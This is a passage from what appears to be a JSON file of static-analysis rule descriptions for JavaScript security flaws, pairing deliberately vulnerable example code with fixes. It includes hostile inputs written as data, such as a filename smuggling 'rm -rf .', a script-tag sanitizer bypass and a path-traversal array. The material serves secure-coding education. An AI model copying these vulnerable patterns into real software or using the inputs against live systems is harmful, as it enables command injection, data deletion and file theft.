tags:\n\n```javascript\n\nstr.replace(/<script\\b[^<]*(?:(?!<\\/script>)<[^<]*)*<\\/script>/g, \"\");  \n\n```\nIf the input string is \"&lt;scrip&lt;script&gt;is removed&lt;/script&gt;t&gt;alert(123)&lt;/script&gt;\", the output will be \"&lt;script&gt;alert(123)&lt;/script&gt;\", which still contains a script tag.\n\nA fix for this issue is to rewrite the regular expression to match single characters (\"&lt;\" and \"&gt;\") instead of the entire unsafe text. This simplifies the sanitization process and ensures that all potentially unsafe characters are removed:\n\n```javascript\n\nfunction removeAllHtmlTags(input) {  \n  return input.replace(/<|>/g, \"\");  \n}\n\n```\nAnother potential fix is to use the popular `sanitize-html` npm library. It keeps most of the safe HTML tags while removing all unsafe tags and attributes.\n\n```javascript\n\nconst sanitizeHtml = require(\"sanitize-html\");\nfunction removeAllHtmlTags(input) {  \n  return sanitizeHtml(input);  \n}\n\n```\n\n## Example\nLastly, consider a path sanitizer using the regular expression `/\\.\\.\\//`:\n\n```javascript\n\nstr.replace(/\\.\\.\\//g, \"\");  \n\n```\nThe regular expression attempts to strip out all occurences of `/../` from `str`. This will not work as expected: for the string `/./.././`, for example, it will remove the single occurrence of `/../` in the middle, but the remainder of the string then becomes `/../`, which is another instance of the substring we were trying to remove.\n\nA possible fix for this issue is to use the \"sanitize-filename\" npm library for path sanitization. This library is specifically designed to handle path sanitization, and should handle all corner cases and ensure effective sanitization:\n\n```javascript\n\nconst sanitize = require(\"sanitize-filename\");  \n  \nfunction sanitizePath(input) {  \n  return sanitize(input);  \n}  \n\n```\n\n## References\n* OWASP Top 10: [A1 Injection](https://www.owasp.org/index.php/Top_10-2017_A1-Injection).\n* Stack Overflow: [Removing all script tags from HTML with JS regular expression](https://stackoverflow.com/questions/6659351/removing-all-script-tags-from-html-with-js-regular-expression).\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n* Common Weakness Enumeration: [CWE-80](https://cwe.mitre.org/data/definitions/80.html).\n* Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n"
  },
  "js/bad-code-sanitization": {
    "name": "Improper code sanitization",
    "description": "Escaping code as HTML does not provide protection against code injection.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 6.1,
    "precision": "high",
    "id": "js/bad-code-sanitization",
    "tags": [
      "security",
      "external/cwe/cwe-094",
      "external/cwe/cwe-079",
      "external/cwe/cwe-116"
    ],
    "filename": "a2d22db7-ImproperCodeSanitization",
    "language": "javascript",
    "help": "# Improper code sanitization\nUsing string concatenation to construct JavaScript code can be error-prone, or in the worst case, enable code injection if an input is constructed by an attacker.\n\n\n## Recommendation\nIf using `JSON.stringify` or an HTML sanitizer to sanitize a string inserted into JavaScript code, then make sure to perform additional sanitization or remove potentially dangerous characters.\n\n\n## Example\nThe example below constructs a function that assigns the number 42 to the property `key` on an object `obj`. However, if `key` contains `</script>`, then the generated code will break out of a `</script>` if inserted into a `</script>` tag.\n\n\n```javascript\nfunction createObjectWrite() {\n    const assignment = `obj[${JSON.stringify(key)}]=42`;\n    return `(function(){${assignment}})` // NOT OK\n}\n```\nThe issue has been fixed by escaping potentially dangerous characters, as shown below.\n\n\n```javascript\nconst charMap = {\n    '<': '\\\\u003C',\n    '>' : '\\\\u003E',\n    '/': '\\\\u002F',\n    '\\\\': '\\\\\\\\',\n    '\\b': '\\\\b',\n    '\\f': '\\\\f',\n    '\\n': '\\\\n',\n    '\\r': '\\\\r',\n    '\\t': '\\\\t',\n    '\\0': '\\\\0',\n    '\\u2028': '\\\\u2028',\n    '\\u2029': '\\\\u2029'\n};\n\nfunction escapeUnsafeChars(str) {\n    return str.replace(/[<>\\b\\f\\n\\r\\t\\0\\u2028\\u2029]/g, x => charMap[x])\n}\n\nfunction createObjectWrite() {\n    const assignment = `obj[${escapeUnsafeChars(JSON.stringify(key))}]=42`;\n    return `(function(){${assignment}})` // OK\n}\n```\n\n## References\n* OWASP: [Code Injection](https://www.owasp.org/index.php/Code_Injection).\n* Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).\n* Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n* Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n"
  },
  "js/command-line-injection": {
    "name": "Uncontrolled command line",
    "description": "Using externally controlled strings in a command line may allow a malicious user to change the meaning of the command.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.8,
    "precision": "high",
    "id": "js/command-line-injection",
    "tags": [
      "correctness",
      "security",
      "external/cwe/cwe-078",
      "external/cwe/cwe-088"
    ],
    "filename": "5ab6110a-CommandInjection",
    "language": "javascript",
    "help": "# Uncontrolled command line\nCode that passes untrusted user input directly to `child_process.exec` or similar APIs that execute shell commands allows the user to execute malicious code.\n\n\n## Recommendation\nIf possible, use APIs that don't run shell commands and that accept command arguments as an array of strings rather than a single concatenated string. This is both safer and more portable.\n\nIf given arguments as a single string, avoid simply splitting the string on whitespace. Arguments may contain quoted whitespace, causing them to split into multiple arguments. Use a library like `shell-quote` to parse the string into an array of arguments instead.\n\nIf this approach is not viable, then add code to verify that the user input string is safe before using it.\n\n\n## Example\nThe following example shows code that extracts a filename from an HTTP query parameter that may contain untrusted data, and then embeds it into a shell command to count its lines without examining it first:\n\n\n```javascript\nvar cp = require(\"child_process\"),\n    http = require('http'),\n    url = require('url');\n\nvar server = http.createServer(function(req, res) {\n    let file = url.parse(req.url, true).query.path;\n\n    cp.execSync(`wc -l ${file}`); // BAD\n});\n\n```\nA malicious user can take advantage of this code by executing arbitrary shell commands. For example, by providing a filename like `foo.txt; rm -rf .`, the user can first count the lines in `foo.txt` and subsequently delete all files in the current directory.\n\nTo avoid this catastrophic behavior, use an API such as `child_process.execFileSync` that does not spawn a shell by default:\n\n\n```javascript\nvar cp = require(\"child_process\"),\n    http = require('http'),\n    url = require('url');\n\nvar server = http.createServer(function(req, res) {\n    let file = url.parse(req.url, true).query.path;\n\n    cp.execFileSync('wc', ['-l', file]); // GOOD\n});\n\n```\nIf you want to allow the user to specify other options to `wc`, you can use a library like `shell-quote` to parse the user input into an array of arguments without risking command injection:\n\n\n```javascript\nvar cp = require(\"child_process\"),\n    http = require('http'),\n    url = require('url'),\n    shellQuote = require('shell-quote');\n\nvar server = http.createServer(function(req, res) {\n    let options = url.parse(req.url, true).query.options;\n\n    cp.execFileSync('wc', shellQuote.parse(options)); // GOOD\n});\n\n```\nAlternatively, the original example can be made safe by checking the filename against an allowlist of safe characters before using it:\n\n\n```javascript\nvar cp = require(\"child_process\"),\n    http = require('http'),\n    url = require('url');\n\nvar server = http.createServer(function(req, res) {\n    let file = url.parse(req.url, true).query.path;\n\n    // only allow safe characters in file name\n    if (file.match(/^[\\w\\.\\-\\/]+$/)) {\n        cp.execSync(`wc -l ${file}`); // GOOD\n    }\n});\n\n```\n\n## References\n* OWASP: [Command Injection](https://www.owasp.org/index.php/Command_Injection).\n* npm: [shell-quote](https://www.npmjs.com/package/shell-quote).\n* Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).\n* Common Weakness Enumeration: [CWE-88](https://cwe.mitre.org/data/definitions/88.html).\n"
  },
  "js/jwt-missing-verification": {
    "name": "JWT missing secret or public key verification",
    "description": "The application does not verify the JWT payload with a cryptographic secret or public key.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 7.0,
    "precision": "high",
    "id": "js/jwt-missing-verification",
    "tags": [
      "security",
      "external/cwe/cwe-347"
    ],
    "filename": "19237d0f-MissingJWTKeyVerification",
    "language": "javascript",
    "help": "# JWT missing secret or public key verification\nApplications decoding JSON Web Tokens (JWT) may be misconfigured due to the `None` algorithm.\n\nThe `None` algorithm is selected by calling the `verify()` function with a falsy value instead of a cryptographic secret or key. The `None` algorithm disables the integrity enforcement of a JWT payload and may allow a malicious actor to make unintended changes to a JWT payload leading to critical security issues like privilege escalation.\n\n\n## Recommendation\nCalls to `verify()` functions should use a cryptographic secret or key to decode JWT payloads.\n\n\n## Example\nIn the example below, `false` is used to disable the integrity enforcement of a JWT payload. This may allow a malicious actor to make changes to a JWT payload.\n\n\n```javascript\nconst jwt = require(\"jsonwebtoken\");\n\nconst secret = \"my-secret-key\";\n\nvar token = jwt.sign({ foo: 'bar' }, secret, { algorithm: \"none\" })\njwt.verify(token, false, { algorithms: [\"HS256\", \"none\"] })\n```\nThe following code fixes the problem by using a cryptographic secret or key to decode JWT payloads.\n\n\n```javascript\n\nconst jwt = require(\"jsonwebtoken\");\n\nconst secret = \"my-secret-key\";\n\nvar token = jwt.sign({ foo: 'bar' }, secret, { algorithm: \"HS256\" }) \njwt.verify(token, secret, { algorithms: [\"HS256\", \"none\"] })\n```\n\n## References\n* Auth0 Blog: [Meet the \"None\" Algorithm](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/#Meet-the--None--Algorithm).\n* Common Weakness Enumeration: [CWE-347](https://cwe.mitre.org/data/definitions/347.html).\n"
  },
  "js/sql-injection": {
    "name": "Database query built from user-controlled sources",
    "description": "Building a database query from user-controlled sources is vulnerable to insertion of malicious code by the user.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 8.8,
    "precision": "high",
    "id": "js/sql-injection",
    "tags": [
      "security",
      "external/cwe/cwe-089",
      "external/cwe/cwe-090",
      "external/cwe/cwe-943"
    ],
    "filename": "3596e394-SqlInjection",
    "language": "javascript",
    "help": "# Database query built from user-controlled sources\nIf a database query (such as a SQL or NoSQL query) is built from user-provided data without sufficient sanitization, a malicious user may be able to run malicious database queries.\n\n\n## Recommendation\nMost database connector libraries offer a way of safely embedding untrusted data into a query by means of query parameters or prepared statements.\n\nFor NoSQL queries, make use of an operator like MongoDB's `$eq` to ensure that untrusted data is interpreted as a literal value and not as a query object. Alternatively, check that the untrusted data is a literal value and not a query object before using it in a query.\n\nFor SQL queries, use query parameters or prepared statements to embed untrusted data into the query string, or use a library like `sqlstring` to escape untrusted data.\n\n\n## Example\nIn the following example, assume the function `handler` is an HTTP request handler in a web application, whose parameter `req` contains the request object.\n\nThe handler constructs an SQL query string from user input and executes it as a database query using the `pg` library. The user input may contain quote characters, so this code is vulnerable to a SQL injection attack.\n\n\n```javascript\nconst app = require(\"express\")(),\n      pg = require(\"pg\"),\n      pool = new pg.Pool(config);\n\napp.get(\"search\", function handler(req, res) {\n  // BAD: the category might have SQL special characters in it\n  var query1 =\n    \"SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='\" +\n    req.params.category +\n    \"' ORDER BY PRICE\";\n  pool.query(query1, [], function(err, results) {\n    // process results\n  });\n});\n\n```\nTo fix this vulnerability, we can use query parameters to embed the user input into the query string. In this example, we use the API offered by the `pg` Postgres database connector library, but other libraries offer similar features. This version is immune to injection attacks.\n\n\n```javascript\nconst app = require(\"express\")(),\n      pg = require(\"pg\"),\n      pool = new pg.Pool(config);\n\napp.get(\"search\", function handler(req, res) {\n  // GOOD: use parameters\n  var query2 =\n    \"SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY=$1 ORDER BY PRICE\";\n  pool.query(query2, [req.params.category], function(err, results) {\n    // process results\n  });\n});\n\n```\nAlternatively, we can use a library like `sqlstring` to escape the user input before embedding it into the query string:\n\n\n```javascript\nconst app = require(\"express\")(),\n      pg = require(\"pg\"),\n      SqlString = require('sqlstring'),\n      pool = new pg.Pool(config);\n\napp.get(\"search\", function handler(req, res) {\n  // GOOD: the category is escaped using mysql.escape\n  var query1 =\n    \"SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='\" +\n    SqlString.escape(req.params.category) +\n    \"' ORDER BY PRICE\";\n  pool.query(query1, [], function(err, results) {\n    // process results\n  });\n});\n\n```\n\n## Example\nIn the following example, an express handler attempts to delete a single document from a MongoDB collection. The document to be deleted is identified by its `_id` field, which is constructed from user input. The user input may contain a query object, so this code is vulnerable to a NoSQL injection attack.\n\n\n```javascript\nconst express = require(\"express\");\nconst mongoose = require(\"mongoose\");\nconst Todo = mongoose.model(\n  \"Todo\",\n  new mongoose.Schema({ text: { type: String } }, { timestamps: true })\n);\n\nconst app = express();\napp.use(express.json());\napp.use(express.urlencoded({ extended: false }));\n\napp.delete(\"/api/delete\", async (req, res) => {\n  let id = req.body.id;\n\n  await Todo.deleteOne({ _id: id }); // BAD: id might be an object with special properties\n\n  res.json({ status: \"ok\" });\n});\n\n```\nTo fix this vulnerability, we can use the `$eq` operator to ensure that the user input is interpreted as a literal value and not as a query object:\n\n\n```javascript\napp.delete(\"/api/delete\", async (req, res) => {\n  let id = req.body.id;\n  await Todo.deleteOne({ _id: { $eq: id } }); // GOOD: using $eq operator for the comparison\n\n  res.json({ status: \"ok\" });\n});\n```\nAlternatively check that the user input is a literal value and not a query object before using it:\n\n\n```javascript\napp.delete(\"/api/delete\", async (req, res) => {\n  let id = req.body.id;\n  if (typeof id !== \"string\") {\n    res.status(400).json({ status: \"error\" });\n    return;\n  }\n  await Todo.deleteOne({ _id: id }); // GOOD: id is guaranteed to be a string\n\n  res.json({ status: \"ok\" });\n});\n\n```\n\n## References\n* Wikipedia: [SQL injection](https://en.wikipedia.org/wiki/SQL_injection).\n* MongoDB: [$eq operator](https://docs.mongodb.com/manual/reference/operator/query/eq).\n* OWASP: [NoSQL injection](https://owasp.org/www-pdf-archive/GOD16-NOSQL.pdf).\n* Common Weakness Enumeration: [CWE-89](https://cwe.mitre.org/data/definitions/89.html).\n* Common Weakness Enumeration: [CWE-90](https://cwe.mitre.org/data/definitions/90.html).\n* Common Weakness Enumeration: [CWE-943](https://cwe.mitre.org/data/definitions/943.html).\n"
  },
  "js/xss": {
    "name": "Client-side cross-site scripting",
    "description": "Writing user input directly to the DOM allows for a cross-site scripting vulnerability.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.8,
    "precision": "high",
    "id": "js/xss",
    "tags": [
      "security",
      "external/cwe/cwe-079",
      "external/cwe/cwe-116"
    ],
    "filename": "bc37419c-Xss",
    "language": "javascript",
    "help": "# Client-side cross-site scripting\nDirectly writing user input (for example, a URL query parameter) to a webpage without properly sanitizing the input first, allows for a cross-site scripting vulnerability.\n\nThis kind of vulnerability is also called *DOM-based* cross-site scripting, to distinguish it from other types of cross-site scripting.\n\n\n## Recommendation\nTo guard against cross-site scripting, consider using contextual output encoding/escaping before writing user input to the page, or one of the other solutions that are mentioned in the references.\n\n\n## Example\nThe following example shows part of the page URL being written directly to the document, leaving the website vulnerable to cross-site scripting.\n\n\n```javascript\nfunction setLanguageOptions() {\n    var href = document.location.href,\n        deflt = href.substring(href.indexOf(\"default=\")+8);\n    document.write(\"<OPTION value=1>\"+deflt+\"</OPTION>\");\n    document.write(\"<OPTION value=2>English</OPTION>\");\n}\n\n```\n\n## References\n* OWASP: [DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html).\n* OWASP: [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).\n* OWASP [DOM Based XSS](https://www.owasp.org/index.php/DOM_Based_XSS).\n* OWASP [Types of Cross-Site Scripting](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting).\n* Wikipedia: [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting).\n* Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n* Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n"
  },
  "js/xml-bomb": {
    "name": "XML internal entity expansion",
    "description": "Parsing user input as an XML document with arbitrary internal entity expansion is vulnerable to denial-of-service attacks.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "high",
    "id": "js/xml-bomb",
    "tags": [
      "security",
      "external/cwe/cwe-776",
      "external/cwe/cwe-400"
    ],
    "filename": "5c56a494-XmlBomb",
    "language": "javascript",
    "help": "# XML internal entity expansion\nParsing untrusted XML files with a weakly configured XML parser may be vulnerable to denial-of-service (DoS) attacks exploiting uncontrolled internal entity expansion.\n\nIn XML, so-called *internal entities* are a mechanism for introducing an abbreviation for a piece of text or part of a document. When a parser that has been configured to expand entities encounters a reference to an internal entity, it replaces the entity by the data it represents. The replacement text may itself contain other entity references, which are expanded recursively. This means that entity expansion can increase document size dramatically.\n\nIf untrusted XML is parsed with entity expansion enabled, a malicious attacker could submit a document that contains very deeply nested entity definitions, causing the parser to take a very long time or use large amounts of memory. This is sometimes called an *XML bomb* attack.\n\n\n## Recommendation\nThe safest way to prevent XML bomb attacks is to disable entity expansion when parsing untrusted data. How this is done depends on the library being used. Note that some libraries, such as recent versions of `libxmljs` (though not its SAX parser API), disable entity expansion by default, so unless you have explicitly enabled entity expansion, no further action is needed.\n\n\n## Example\nThe following example uses the XML parser provided by the `node-expat` package to parse a string `xmlSrc`. If that string is from an untrusted source, this code may be vulnerable to a DoS attack, since `node-expat` expands internal entities by default:\n\n\n```javascript\nconst app = require(\"express\")(),\n  expat = require(\"node-expat\");\n\napp.post(\"upload\", (req, res) => {\n  let xmlSrc = req.body,\n    parser = new expat.Parser();\n  parser.on(\"startElement\", handleStart);\n  parser.on(\"text\", handleText);\n  parser.write(xmlSrc);\n});\n\n```\nAt the time of writing, `node-expat` does not provide a way of controlling entity expansion, but the example could be rewritten to use the `sax` package instead, which only expands standard entities such as `&amp;`:\n\n\n```javascript\nconst app = require(\"express\")(),\n  sax = require(\"sax\");\n\napp.post(\"upload\", (req, res) => {\n  let xmlSrc = req.body,\n    parser = sax.parser(true);\n  parser.onopentag = handleStart;\n  parser.ontext = handleText;\n  parser.write(xmlSrc);\n});\n\n```\n\n## References\n* Wikipedia: [Billion Laughs](https://en.wikipedia.org/wiki/Billion_laughs).\n* Bryan Sullivan: [Security Briefs - XML Denial of Service Attacks and Defenses](https://msdn.microsoft.com/en-us/magazine/ee335713.aspx).\n* Common Weakness Enumeration: [CWE-776](https://cwe.mitre.org/data/definitions/776.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n"
  },
  "js/user-controlled-data-decompression": {
    "name": "User-controlled file decompression",
    "description": "User-controlled data that flows into decompression library APIs without checking the compression rate is dangerous",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.8,
    "precision": "high",
    "id": "js/user-controlled-data-decompression",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-522"
    ],
    "filename": "600e212e-DecompressionBombs",
    "language": "javascript",
    "help": "# User-controlled file decompression\nExtracting Compressed files with any compression algorithm like gzip can cause to denial of service attacks.\n\nAttackers can compress a huge file which created by repeated similiar byte and convert it to a small compressed file.\n\n\n## Recommendation\nWhen you want to decompress a user-provided compressed file you must be careful about the decompression ratio or read these files within a loop byte by byte to be able to manage the decompressed size in each cycle of the loop.\n\n\n## Example\nJsZip: check uncompressedSize Object Field before extraction.\n\n\n```javascript\nconst jszipp = require(\"jszip\");\nfunction zipBombSafe(zipFile) {\n    jszipp.loadAsync(zipFile.data).then(function (zip) {\n        if (zip.file(\"10GB\")[\"_data\"][\"uncompressedSize\"] > 1024 * 1024 * 8) {\n            console.log(\"error\")\n        }\n        zip.file(\"10GB\").async(\"uint8array\").then(function (u8) {\n            console.log(u8);\n        });\n    });\n}\n```\nnodejs Zlib: use [maxOutputLength option](https://nodejs.org/dist/latest-v18.x/docs/api/zlib.html#class-options) which it'll limit the buffer read size\n\n\n```javascript\nconst zlib = require(\"zlib\");\n\nzlib.gunzip(\n    inputZipFile.data,\n    { maxOutputLength: 1024 * 1024 * 5 },\n    (err, buffer) => {\n        doSomeThingWithData(buffer);\n    });\nzlib.gunzipSync(inputZipFile.data, { maxOutputLength: 1024 * 1024 * 5 });\n\ninputZipFile.pipe(zlib.createGunzip({ maxOutputLength: 1024 * 1024 * 5 })).pipe(outputFile);\n```\nnode-tar: use [maxReadSize option](https://github.com/isaacs/node-tar/blob/8c5af15e43a769fd24aa7f1c84d93e54824d19d2/lib/list.js#L90) which it'll limit the buffer read size\n\n\n```javascript\nconst tar = require(\"tar\");\n\ntar.x({\n    file: tarFileName,\n    strip: 1,\n    C: 'some-dir',\n    maxReadSize: 16 * 1024 * 1024 // 16 MB\n})\n```\n\n## References\n* [CVE-2017-16129](https://github.com/advisories/GHSA-8225-6cvr-8pqp)\n* [A great research to gain more impact by this kind of attacks](https://www.bamsoftware.com/hacks/zipbomb/)\n* Common Weakness Enumeration: [CWE-522](https://cwe.mitre.org/data/definitions/522.html).\n"
  },
  "js/sql-injection-more-sources": {
    "name": "Database query built from user-controlled sources with additional heuristic sources",
    "description": "Building a database query from user-controlled sources is vulnerable to insertion of malicious code by the user.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 8.8,
    "precision": "high",
    "id": "js/sql-injection-more-sources",
    "tags": [
      "experimental",
      "security",
      "external/cwe/cwe-089",
      "external/cwe/cwe-090",
      "external/cwe/cwe-943"
    ],
    "filename": "c8ac69da-SqlInjection",
    "language": "javascript",
    "help": "# Database query built from user-controlled sources with additional heuristic sources\nIf a database query (such as a SQL or NoSQL query) is built from user-provided data without sufficient sanitization, a malicious user may be able to run malicious database queries.\n\n\n## Recommendation\nMost database connector libraries offer a way of safely embedding untrusted data into a query by means of query parameters or prepared statements.\n\nFor NoSQL queries, make use of an operator like MongoDB's `$eq` to ensure that untrusted data is interpreted as a literal value and not as a query object. Alternatively, check that the untrusted data is a literal value and not a query object before using it in a query.\n\nFor SQL queries, use query parameters or prepared statements to embed untrusted data into the query string, or use a library like `sqlstring` to escape untrusted data.\n\n\n## Example\nIn the following example, assume the function `handler` is an HTTP request handler in a web application, whose parameter `req` contains the request object.\n\nThe handler constructs an SQL query string from user input and executes it as a database query using the `pg` library. The user input may contain quote characters, so this code is vulnerable to a SQL injection attack.\n\n\n```javascript\nconst app = require(\"express\")(),\n      pg = require(\"pg\"),\n      pool = new pg.Pool(config);\n\napp.get(\"search\", function handler(req, res) {\n  // BAD: the category might have SQL special characters in it\n  var query1 =\n    \"SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='\" +\n    req.params.category +\n    \"' ORDER BY PRICE\";\n  pool.query(query1, [], function(err, results) {\n    // process results\n  });\n});\n\n```\nTo fix this vulnerability, we can use query parameters to embed the user input into the query string. In this example, we use the API offered by the `pg` Postgres database connector library, but other libraries offer similar features. This version is immune to injection attacks.\n\n\n```javascript\nconst app = require(\"express\")(),\n      pg = require(\"pg\"),\n      pool = new pg.Pool(config);\n\napp.get(\"search\", function handler(req, res) {\n  // GOOD: use parameters\n  var query2 =\n    \"SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY=$1 ORDER BY PRICE\";\n  pool.query(query2, [req.params.category], function(err, results) {\n    // process results\n  });\n});\n\n```\nAlternatively, we can use a library like `sqlstring` to escape the user input before embedding it into the query string:\n\n\n```javascript\nconst app = require(\"express\")(),\n      pg = require(\"pg\"),\n      SqlString = require('sqlstring'),\n      pool = new pg.Pool(config);\n\napp.get(\"search\", function handler(req, res) {\n  // GOOD: the category is escaped using mysql.escape\n  var query1 =\n    \"SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='\" +\n    SqlString.escape(req.params.category) +\n    \"' ORDER BY PRICE\";\n  pool.query(query1, [], function(err, results) {\n    // process results\n  });\n});\n\n```\n\n## Example\nIn the following example, an express handler attempts to delete a single document from a MongoDB collection. The document to be deleted is identified by its `_id` field, which is constructed from user input. The user input may contain a query object, so this code is vulnerable to a NoSQL injection attack.\n\n\n```javascript\nconst express = require(\"express\");\nconst mongoose = require(\"mongoose\");\nconst Todo = mongoose.model(\n  \"Todo\",\n  new mongoose.Schema({ text: { type: String } }, { timestamps: true })\n);\n\nconst app = express();\napp.use(express.json());\napp.use(express.urlencoded({ extended: false }));\n\napp.delete(\"/api/delete\", async (req, res) => {\n  let id = req.body.id;\n\n  await Todo.deleteOne({ _id: id }); // BAD: id might be an object with special properties\n\n  res.json({ status: \"ok\" });\n});\n\n```\nTo fix this vulnerability, we can use the `$eq` operator to ensure that the user input is interpreted as a literal value and not as a query object:\n\n\n```javascript\napp.delete(\"/api/delete\", async (req, res) => {\n  let id = req.body.id;\n  await Todo.deleteOne({ _id: { $eq: id } }); // GOOD: using $eq operator for the comparison\n\n  res.json({ status: \"ok\" });\n});\n```\nAlternatively check that the user input is a literal value and not a query object before using it:\n\n\n```javascript\napp.delete(\"/api/delete\", async (req, res) => {\n  let id = req.body.id;\n  if (typeof id !== \"string\") {\n    res.status(400).json({ status: \"error\" });\n    return;\n  }\n  await Todo.deleteOne({ _id: id }); // GOOD: id is guaranteed to be a string\n\n  res.json({ status: \"ok\" });\n});\n\n```\n\n## References\n* Wikipedia: [SQL injection](https://en.wikipedia.org/wiki/SQL_injection).\n* MongoDB: [$eq operator](https://docs.mongodb.com/manual/reference/operator/query/eq).\n* OWASP: [NoSQL injection](https://owasp.org/www-pdf-archive/GOD16-NOSQL.pdf).\n* Common Weakness Enumeration: [CWE-89](https://cwe.mitre.org/data/definitions/89.html).\n* Common Weakness Enumeration: [CWE-90](https://cwe.mitre.org/data/definitions/90.html).\n* Common Weakness Enumeration: [CWE-943](https://cwe.mitre.org/data/definitions/943.html).\n"
  },
  "js/exposure-of-private-files": {
    "name": "Exposure of private files",
    "description": "Exposing a node_modules folder, or the project folder to the public, can cause exposure of private information.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 6.5,
    "id": "js/exposure-of-private-files",
    "tags": [
      "security",
      "external/cwe/cwe-200",
      "external/cwe/cwe-219",
      "external/cwe/cwe-548"
    ],
    "precision": "high",
    "filename": "440a7211-PrivateFileExposure",
    "language": "javascript",
    "help": "# Exposure of private files\nLibraries like `express` provide easy methods for serving entire directories of static files from a web server. However, using these can sometimes lead to accidental information exposure. If for example the `node_modules` folder is served, then an attacker can access the `_where` field from a `package.json` file, which gives access to the absolute path of the file.\n\n\n## Recommendation\nLimit which folders of static files are served from a web server.\n\n\n## Example\nIn the example below, all the files from the `node_modules` are served. This allows clients to easily access all the files inside that folder, which includes potentially private information inside `package.json` files.\n\n\n```javascript\n\nvar express = require('express');\n\nvar app = express();\n\napp.use('/node_modules', express.static(path.resolve(__dirname, '../node_modules')));\n```\nThe issue has been fixed below by only serving specific folders within the `node_modules` folder.\n\n\n```javascript\n\nvar express = require('express');\n\nvar app = express();\n\napp.use(\"jquery\", express.static('./node_modules/jquery/dist'));\napp.use(\"bootstrap\", express.static('./node_modules/bootstrap/dist'));\n```\n\n## References\n* OWASP: [Sensitive Data Exposure](https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure).\n* Common Weakness Enumeration: [CWE-200](https://cwe.mitre.org/data/definitions/200.html).\n* Common Weakness Enumeration: [CWE-219](https://cwe.mitre.org/data/definitions/219.html).\n* Common Weakness Enumeration: [CWE-548](https://cwe.mitre.org/data/definitions/548.html).\n"
  },
  "js/type-confusion-through-parameter-tampering": {
    "name": "Type confusion through parameter tampering",
    "description": "Sanitizing an HTTP request parameter may be ineffective if the user controls its type.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.8,
    "precision": "high",
    "id": "js/type-confusion-through-parameter-tampering",
    "tags": [
      "security",
      "external/cwe/cwe-843"
    ],
    "filename": "ce53e99b-TypeConfusionThroughParameterTampering",
    "language": "javascript",
    "help": "# Type confusion through parameter tampering\nSanitizing untrusted HTTP request parameters is a common technique for preventing injection attacks such as SQL injection or path traversal. This is sometimes done by checking if the request parameters contain blacklisted substrings.\n\nHowever, sanitizing request parameters assuming they have type `String` and using the builtin string methods such as `String.prototype.indexOf` is susceptible to type confusion attacks. In a type confusion attack, an attacker tampers with an HTTP request parameter such that it has a value of type `Array` instead of the expected type `String`. Furthermore, the content of the array has been crafted to bypass sanitizers by exploiting that some identically named methods of strings and arrays behave differently.\n\n\n## Recommendation\nCheck the runtime type of sanitizer inputs if the input type is user-controlled.\n\nAn even safer alternative is to design the application so that sanitization is not needed, for instance by using prepared statements for SQL queries.\n\n\n## Example\nFor example, Node.js server frameworks usually present request parameters as strings. But if an attacker sends multiple request parameters with the same name, then the request parameter is represented as an array instead.\n\nIn the following example, a sanitizer checks that a path does not contain the `\"..\"` string, which would allow an attacker to access content outside a user-accessible directory.\n\n\n```javascript\nvar app = require(\"express\")(),\n  path = require(\"path\");\n\napp.get(\"/user-files\", function(req, res) {\n  var file = req.param(\"file\");\n  if (file.indexOf(\"..\") !== -1) {\n    // BAD\n    // we forbid relative paths that contain ..\n    // as these could leave the public directory\n    res.status(400).send(\"Bad request\");\n  } else {\n    var absolute = path.resolve(\"/public/\" + file);\n    console.log(\"Sending file: %s\", absolute);\n    res.sendFile(absolute);\n  }\n});\n\n```\nAs written, this sanitizer is ineffective: an array like `[\"../\", \"/../secret.txt\"]` will bypass the sanitizer. The array does not contain `\"..\"` as an element, so the call to `indexOf` returns `-1` . This is problematic since the value of the `absolute` variable then ends up being `\"/secret.txt\"`. This happens since the concatenation of `\"/public/\"` and the array results in `\"/public/../,/../secret.txt\"`, which the `resolve`-call converts to `\"/secret.txt\"`.\n\nTo fix the sanitizer, check that the request parameter is a string, and not an array:\n\n\n```javascript\nvar app = require(\"express\")(),\n  path = require(\"path\");\n\napp.get(\"/user-files\", function(req, res) {\n  var file = req.param(\"file\");\n  if (typeof file !== 'string' || file.indexOf(\"..\") !== -1) {\n    // GOOD\n    // we forbid relative paths that contain ..\n    // as these could leave the public directory\n    res.status(400).send(\"Bad request\");\n  } else {\n    var absolute = 